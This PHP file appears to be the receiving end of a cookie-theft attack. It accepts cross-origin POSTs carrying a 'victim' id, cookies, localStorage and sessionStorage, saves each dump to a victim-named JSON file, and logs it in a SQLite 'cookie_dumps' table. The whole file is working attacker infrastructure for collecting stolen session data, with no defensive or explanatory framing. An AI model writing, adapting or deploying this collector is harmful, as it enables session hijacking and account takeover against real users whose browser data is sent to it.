<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { exit(0); }

define('STORAGE_DIR', '../storage/cookies/');
define('DB_FILE', '../storage/box26.db');

if (!is_dir(STORAGE_DIR)) { mkdir(STORAGE_DIR, 0755, true); }

try {
    $db = new PDO('sqlite:' . DB_FILE);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    $db->exec("CREATE TABLE IF NOT EXISTS cookie_dumps (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        url TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        cookie_count INTEGER,
        local_count INTEGER,
        session_count INTEGER,
        filename TEXT,
        processed BOOLEAN DEFAULT 0
    )");
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(['error' => 'Database error']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);

if (!$input) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid input']);
    exit;
}

$victimId = $input['victim'] ?? 'UNKNOWN';
$cookies = $input['cookies'] ?? [];
$localStorage = $input['localStorage'] ?? [];
$sessionStorage = $input['sessionStorage'] ?? [];

$filename = STORAGE_DIR . "cookies_{$victimId}_" . date('Ymd_His') . ".json";
file_put_contents($filename, json_encode($input, JSON_PRETTY_PRINT));

$stmt = $db->prepare("INSERT INTO cookie_dumps (victim_id, url, cookie_count, local_count, session_count, filename) VALUES (?, ?, ?, ?, ?, ?)");
$stmt->execute([
    $victimId,
    $input['url'] ?? '',
    count($cookies),
    count($localStorage),
    count($sessionStorage),
    $filename
]);

echo json_encode(['success' => true, 'filename' => basename($filename)]);
?>
